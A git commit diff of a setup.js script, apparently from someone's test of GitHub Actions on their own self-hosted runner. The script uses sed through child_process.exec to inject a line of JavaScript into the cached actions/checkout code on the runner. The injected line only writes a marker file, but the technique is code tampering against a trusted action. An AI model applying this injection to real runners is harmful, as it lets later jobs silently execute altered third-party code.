3b07fa7c7201868915b1e30ebb5ecbf2ad2748e6
musset0 <musset025@gmail.com>
2023-09-04 13:48:55 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -16,7 +16,7 @@ console.log("this is a setup.....")
 // });
 
 
-let writecontent = 'const fs = __importStar(__webpack_require__(747));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
+let writecontent = 'const fs = __importStar(__nccwpck_require__(7147));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
 
 cl_process.exec(`sed -i '1839i ${writecontent}'  /home/musset/Documents/actions-runner/_work/_actions/actions/checkout/v3/dist/index.js`, (err, stdout, stderr) => {
     if (err){
